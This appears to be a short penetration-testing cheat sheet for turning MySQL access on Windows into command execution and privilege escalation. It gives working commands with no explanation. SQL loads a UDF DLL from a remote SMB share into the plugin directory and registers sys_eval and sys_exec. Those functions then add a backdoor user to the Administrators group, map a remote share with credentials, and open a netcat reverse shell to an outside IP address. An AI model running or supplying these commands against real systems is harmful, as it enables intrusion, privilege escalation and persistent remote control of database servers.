# MySQL-to-RCE-or-PrivEsc

# *Setup for Windows*

```bash
select @@plugin_dir;
```
```bash
select load_file('\\\\10.0.0.5\\share\\lib_mysqludf_sys_64.dll') into dumpfile "C:\\xampp\\mysql\\lib\\plugin\\udf.dll";
```
```bash
create function sys_bineval returns int soname 'udf.dll';
```
```bash
create function sys_eval returns string soname 'udf.dll';
```
```bash
select * from mysql.func where name = 'sys_bineval';
```
```bash
select * from mysql.func where name = 'sys_eval';
```

# *Execute Commands Samples for Windows*

```bash
select sys_eval('dir C:\\Users\\4rch\\Desktop\\');
```
```bash
select sys_exec("net user 4rchantos Passwd1 /add");
```
```bash
select sys_exec("net localgroup Administrators 4rchantos /add");
```
```bash
select sys_eval("net use X: \\\\10.0.0.5\\share /user:user passwd");
```
```bash
select sys_eval("C:\\Users\\4rch\\Desktop\\nc.exe -e cmd.exe 192.168.49.125 80");
```
